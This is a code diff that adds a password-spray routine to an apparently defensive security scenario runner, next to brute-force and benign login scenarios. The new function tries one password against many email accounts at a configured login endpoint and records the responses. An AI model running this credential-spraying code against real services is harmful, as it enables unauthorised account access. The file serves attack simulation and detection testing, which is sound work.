@@ -82,6 +82,74 @@ def run_auth_bruteforce(scenario: dict) -> dict:
     }
 
 
+def run_password_spray(scenario: dict) -> dict:
+    scenario_id = scenario["id"]
+    endpoint = scenario["target"]["endpoint"]
+    emails = scenario["attack"]["emails"]
+    password = scenario["attack"]["password"]
+
+    url = f"{BASE_URL}{endpoint}"
+
+    print("\n[SecureOps Password Spray Runner]")
+    print(f"Scenario: {scenario_id}")
+    print(f"Target:   {url}")
+    print(f"Accounts: {len(emails)}")
+    print("-" * 60)
+
+    attempts = []
+
+    for number, email in enumerate(emails, start=1):
+        started_at = time.time()
+
+        try:
+            response = requests.post(
+                url,
+                json={
+                    "email": email,
+                    "password": password
+                },
+                timeout=5
+            )
+
+            elapsed_ms = round(
+                (time.time() - started_at) * 1000,
+                2
+            )
+
+            attempts.append({
+                "attempt": number,
+                "email": email,
+                "status_code": response.status_code,
+                "elapsed_ms": elapsed_ms
+            })
+
+            print(
+                f"[Attempt {number}] "
+                f"{email} -> HTTP {response.status_code} "
+                f"({elapsed_ms} ms)"
+            )
+
+        except requests.RequestException as exc:
+            attempts.append({
+                "attempt": number,
+                "email": email,
+                "error": str(exc)
+            })
+
+            print(
+                f"[Attempt {number}] "
+                f"{email} -> Request failed: {exc}"
+            )
+
+        time.sleep(0.2)
+
+    return {
+        "scenario_id": scenario_id,
+        "attempt_count": len(attempts),
+        "attempts": attempts
+    }
+
+
 def run_benign_auth(scenario: dict) -> dict:
     scenario_id = scenario["id"]
     endpoint = scenario["target"]["endpoint"]
@@ -166,16 +234,20 @@ def main():
         sys.exit(1)
 
     scenario = load_scenario(sys.argv[1])
+    scenario_id = scenario["id"]
 
-    if scenario["id"].startswith("AUTH-BRUTEFORCE"):
+    if scenario_id.startswith("AUTH-BRUTEFORCE"):
         result = run_auth_bruteforce(scenario)
 
-    elif scenario["id"].startswith("BENIGN-AUTH"):
+    elif scenario_id.startswith("AUTH-PASSWORD-SPRAY"):
+        result = run_password_spray(scenario)
+
+    elif scenario_id.startswith("BENIGN-AUTH"):
         result = run_benign_auth(scenario)
 
     else:
         raise ValueError(
-            f"Unsupported scenario: {scenario['id']}"
+            f"Unsupported scenario: {scenario_id}"
         )
 
     print("-" * 60)
